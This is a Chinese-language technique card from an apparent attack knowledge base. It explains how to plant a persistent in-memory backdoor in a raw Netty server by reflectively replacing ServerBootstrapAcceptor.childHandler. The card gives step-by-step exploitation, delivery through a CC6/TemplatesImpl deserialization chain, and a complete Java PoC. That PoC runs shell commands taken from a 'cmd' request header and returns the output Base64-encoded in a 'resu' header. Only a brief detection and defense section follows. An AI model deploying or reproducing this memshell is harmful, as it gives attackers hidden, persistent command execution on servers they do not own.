---
id: web-java-component-netty-serverbootstrapacceptor-childhandler-memshell
title: 原始 Netty ServerBootstrapAcceptor.childHandler 替换：全局 Handler 内存马与 cmd 头回显
type: scenario
domain: web
path: web/java/component
technique: netty-serverbootstrapacceptor-childhandler-memshell
aliases:
- Netty ServerBootstrapAcceptor 内存马
- childHandler 替换
- ServerBootstrapInterceptor
- Netty 全局 Handler 注入
- cmd 头命令回显
- resu 头 Base64
tags:
- java
- netty
- memshell
- persistence
- serverbootstrap
- childhandler
- channelpipeline
- reflection
- templatesimpl
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V241
  verified_at: '2026-11-07T13:11:11+08:00'
  notes: 已对照原文与21张图核对；ServerBootstrapAcceptor.childHandler 替换、cmd/resu 头与三 class 投递均一致；未在目标环境复跑。
---

## 一句话结论

在原始 Netty 服务端拿到一次 Java 代码执行后，可以沿 `ThreadGroup.threads → Thread.target → val$eventExecutor → unwrappedSelector → keys → attachment.pipeline` 找到 `ServerBootstrapAcceptor`，反射把它的 `childHandler` 替换成一个包装过的 `ChannelInitializer`：先调用原 `initChannel` 保持业务 pipeline 不变，再给每个新连接加入 `HttpServerCodec` 和一个读取 `cmd` 请求头、执行命令并把结果 Base64 放进 `resu` 响应头的 `ChannelInboundHandlerAdapter`；由于每个新连接都重新执行 `childHandler.initChannel`，Handler 持久生效，无需注册路由或落地文件。

## 原理

- Netty 的 `ServerBootstrap` 在 acceptor 阶段把 `childHandler` 交给 `ServerBootstrapAcceptor`；每个新接入的 `SocketChannel` 注册时，`ServerBootstrapAcceptor.channelRead` 会调用 `childHandler`（通常是 `ChannelInitializer`）的 `initChannel`，为连接构建 pipeline。
- 因此只要替换 `ServerBootstrapAcceptor.childHandler`，就能让所有**新连接**的 pipeline 都带上恶意 Handler；已建立连接不受影响，但攻击者重新发起连接即可触发。
- **定位 ServerBootstrapAcceptor**：原文从当前线程的 `ThreadGroup` 取 `threads` 数组，逐个线程反射 `target`（Netty 的 `ThreadPerTaskExecutor` 包装）→ `val$eventExecutor` → `unwrappedSelector` → `keys`（SelectionKey 集合）→ 取一个 key 的 `attachment` → `pipeline` → `head` → `next` → `handler`，判断 `handler.toString()` 是否包含 `ServerBootstrap`；命中即为 acceptor 侧对象。
- **包装 childHandler**：反射 `ServerBootstrapAcceptor.childHandler` 拿到原 `ChannelInitializer`；通过 `ChannelInitializer.class.getDeclaredMethod("initChannel", Channel.class)` 反射调用原初始化逻辑，保证业务 Handler 仍然安装；随后 `ch.pipeline().addFirst("print", maliciousHandler)`，再 `ch.pipeline().addFirst(new HttpServerCodec())`（第二次 addFirst 让 codec 位于 maliciousHandler 之前，从而把字节流解码成 `HttpRequest`）。
- **恶意 Handler**：`channelRead` 中若 `msg instanceof HttpRequest`，读取 `cmd` 头，用 `/bin/sh -c` 执行；把 stdout 收集后 Base64 编码，写入 `FullHttpResponse` 的 `resu` 响应头并 `writeAndFlush`。原文实测 `GET /` 带 `cmd: whoami` 返回 `resu: ZGVs...`，Base64 解码得到命令输出；`GET /user` 带 `Authorization: cat /flag` 返回 flag 的 Base64。
- **投递方式**：原文把 `ServerBootstrapInterceptor` 编译成 `AbstractTranslet` 子类，静态块中执行 `new ServerBootstrapInterceptor().injectHandlerIntoAcceptor(getServer())`；再用 CC6 + `TemplatesImpl` 加载。因为类里有匿名内部类，`_bytecodes` 需要按顺序放入 `ServerBootstrapInterceptor.class`、`ServerBootstrapInterceptor$1.class`、`ServerBootstrapInterceptor$1$1.class` 三个字节码。
- **为什么难以按路由鉴权拦截**：Handler 位于 Netty pipeline 最前端的 HTTP 解码之后、业务路由/Filter 之前；任意路径、任意 Host 都会先进入恶意 Handler，不依赖 Blade/Spring 的路由表，也不受网关路由白名单约束。

## 触发条件

- 目标为原始 Netty 服务端（非 Spring WebFlux 的 Reactor Netty 封装也可，只要存在 `ServerBootstrapAcceptor` 且能从线程/对象图定位）。
- 攻击者已能执行一次 Java 代码或反序列化/TemplatesImpl 投递能力。
- Netty 版本中 `ServerBootstrapAcceptor`、`childHandler` 字段名与线程对象字段名（`target`、`val$eventExecutor`、`unwrappedSelector`、`keys`、`attachment`）保持原文结构；版本差异时需按实际字段调整。
- 目标允许新连接进入；Handler 只对新连接生效。
- 若用 `TemplatesImpl` 投递，需要 JDK 8 与可用的 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`。

## 利用步骤

1. 编写继承 `AbstractTranslet` 的类，静态块调用注入逻辑（`getServer()` + `injectHandlerIntoAcceptor()`），并实现空的 `transform` 方法。
2. 在 `getServer()` 中遍历 `ThreadGroup.threads`，按 `target → val$eventExecutor → unwrappedSelector → keys → attachment → pipeline → head.next.handler` 找到 `toString()` 含 `ServerBootstrap` 的 handler。
3. 反射取 `childHandler`，保存原 `ChannelInitializer`；创建新的 `ChannelInitializer<SocketChannel>`，在 `initChannel` 中先反射调用原 `initChannel`，再 `addFirst` 恶意 Handler 和 `HttpServerCodec`。
4. 恶意 Handler 读取 `cmd` 头执行命令，Base64 输出写入 `resu` 头，返回 `FullHttpResponse`。
5. 把新 initializer 写回 `ServerBootstrapAcceptor.childHandler`。
6. 用 CC6/TemplatesImpl 加载该类的字节码（含匿名内部类时把多个 class 按顺序放入 `_bytecodes` 二维数组），投递到反序列化入口。
7. 新建连接请求任意路径，携带 `cmd` 头执行命令；用 `resu` 头的 Base64 解码输出。

## PoC

```java
public class ServerBootstrapInterceptor extends AbstractTranslet {
    static {
        try {
            new ServerBootstrapInterceptor().injectHandlerIntoAcceptor(getServer());
        } catch (Exception e) { e.printStackTrace(); }
    }

    static Object getServer() throws Exception {
        ThreadGroup group = Thread.currentThread().getThreadGroup();
        Field f = group.getClass().getDeclaredField("threads");
        f.setAccessible(true);
        Thread[] threads = (Thread[]) f.get(group);
        for (Thread t : threads) {
            try {
                if (t == null) continue;
                HashSet keys = (HashSet) getFV(getFV(getFV(getFV(t, "target"),
                        "val$eventExecutor"), "unwrappedSelector"), "keys");
                Object key = keys.iterator().next();
                Object handler = getFV(getFV(getFV(getFV(getFV(key, "attachment"),
                        "pipeline"), "head"), "next"), "handler");
                if (handler.toString().contains("ServerBootstrap")) return handler;
            } catch (Exception ignored) {}
        }
        return null;
    }

    static void injectHandlerIntoAcceptor(Object acceptor) throws Exception {
        Field childHandlerField = acceptor.getClass().getDeclaredField("childHandler");
        childHandlerField.setAccessible(true);
        ChannelInitializer<SocketChannel> original =
                (ChannelInitializer<SocketChannel>) childHandlerField.get(acceptor);
        Method initChannel = ChannelInitializer.class.getDeclaredMethod("initChannel", Channel.class);
        initChannel.setAccessible(true);

        childHandlerField.set(acceptor, new ChannelInitializer<SocketChannel>() {
            protected void initChannel(SocketChannel ch) throws Exception {
                initChannel.invoke(original, ch);           // 保留业务 pipeline
                ch.pipeline().addFirst("print", new ChannelInboundHandlerAdapter() {
                    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
                        if (msg instanceof HttpRequest) {
                            String cmd = ((HttpRequest) msg).headers().get("cmd");
                            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
                            String out = new Scanner(p.getInputStream()).useDelimiter("\\A").next();
                            String b64 = Base64.getEncoder().encodeToString(out.getBytes());
                            FullHttpResponse resp = new DefaultFullHttpResponse(
                                    HttpVersion.HTTP_1_1, HttpResponseStatus.OK);
                            resp.headers().set("resu", b64);
                            ctx.writeAndFlush(resp);
                        }
                        super.channelRead(ctx, msg);
                    }
                });
                ch.pipeline().addFirst(new HttpServerCodec()); // codec 在恶意 Handler 之前
            }
        });
    }

    public void transform(DOM d, SerializationHandler[] h) {}
    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) {}
}
```

```http
GET / HTTP/1.1
Host: target:9000
cmd: whoami

HTTP/1.1 200 OK
resu: ZGVs...
```

## 变体与关联

- 与库内“Netty ChannelPipeline 内存马：替换 doOnChannelInit 注入恶意 Handler”的区别：后者针对 Spring WebFlux/Reactor Netty 的 `NettyWebServer`/`doOnChannelInit`，本卡针对原始 Netty 的 `ServerBootstrapAcceptor.childHandler`，定位路径和注入点都不同；相同点是最终都是在 pipeline 前端插 Handler。
- 与 Blade 路由内存马的区别：本卡不依赖 `RouteMatcher`/`WebContext`，不新增路由，任意路径均可触发；Blade 路由型需要访问注册的路径。
- 变体：把恶意 Handler 改成读取 `Authorization` 头（原文也演示了 `Authorization: whoami` / `cat /flag`）；或用 `HttpObjectAggregator` 处理大请求体。
- 投递变体：`TemplatesImpl._bytecodes` 放多个 class 可加载含匿名内部类的内存马；原文用 CC6/TemplatesImpl 链加载三个 class。

## 检测与防御

- **内存马排查**：枚举活跃连接的 `ChannelPipeline`，检查是否有非业务 Handler（尤其名为 `print`、类名可疑、位于 `HttpServerCodec` 之后的 Handler）；对比启动基线的 pipeline 组成。
- **防注入**：避免反序列化不可信数据；使用 JEP290 全局过滤器/白名单；限制 `TemplatesImpl`、`InvokerTransformer` 等 gadget 类；禁用或限制 JMX/RMI。
- **运行时防护**：用 Java agent/字节码插桩监控 `ServerBootstrapAcceptor.childHandler` 的反射修改；限制对 `sun.misc.Unsafe`/反射字段写入的滥用；对异常 `cmd` 头、`resu` 响应头做流量检测。
- **最小权限**：Web 进程降权，限制 `/bin/sh` 执行与读取敏感文件；对 `/flag` 等敏感路径做文件权限隔离。
